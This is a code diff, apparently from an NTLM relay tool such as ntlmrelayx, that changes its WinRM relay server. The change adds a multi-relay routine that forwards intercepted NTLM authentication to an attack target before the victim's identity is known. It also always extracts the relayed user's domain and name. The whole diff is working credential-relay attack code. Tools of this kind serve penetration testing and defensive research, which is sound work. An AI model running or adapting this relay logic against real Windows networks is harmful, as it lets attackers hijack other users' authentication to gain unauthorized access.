@@ -196,13 +196,7 @@ class WinRMRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or -in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                # We can start the relay process
-                self.do_relay(messageType, token, proxy, content)
+            self.do_multirelay(messageType, token, proxy, content)
 
         def do_AUTHHEAD(self, message = b'', proxy=False):
             if proxy:
@@ -281,14 +275,23 @@ class WinRMRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
-            if self.relayToHost is False and not self.server.config.disableMulti:
-                self.do_local_auth(messageType, token, proxy)
-                return
-            else:
-                self.do_relay(messageType, token, proxy)
+            self.do_multirelay(messageType, token, proxy)
 
             return
+
+        def do_multirelay(self, messageType, token, proxy, content=None):
+            if self.server.config.disableMulti or self.relayToHost:
+                return self.do_relay(messageType, token, proxy, content)
+
+            if messageType == 1:
+                self.target = self.server.config.target.getTarget()
+                if self.target is not None:
+                    LOG.info("(WinRM): Received connection from %s, attacking target %s://%s before identity discovery" %
+                             (self.client_address[0], self.target.scheme, self.target.netloc))
+                    self.relayToHost = True
+                    return self.do_relay(messageType, token, proxy, content)
+
+            return self.do_local_auth(messageType, token, proxy)
 
         def do_ntlm_negotiate(self, token, proxy):
             if self.target.scheme.upper() in self.server.config.protocolClients:
@@ -429,14 +432,14 @@ class WinRMRelayServer(Thread):
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
 
-                if self.server.config.disableMulti:
-                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
-                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
-                                                    authenticateMessage['user_name'].decode('utf-16le'))).upper()
-                    else:
-                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
-                                                    authenticateMessage['user_name'].decode('ascii'))).upper()
+                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                authenticateMessage['user_name'].decode('utf-16le'))).upper()
+                else:
+                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
+                                                authenticateMessage['user_name'].decode('ascii'))).upper()
 
+                if self.server.config.disableMulti:
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
                 if not self.do_ntlm_auth(token, authenticateMessage):
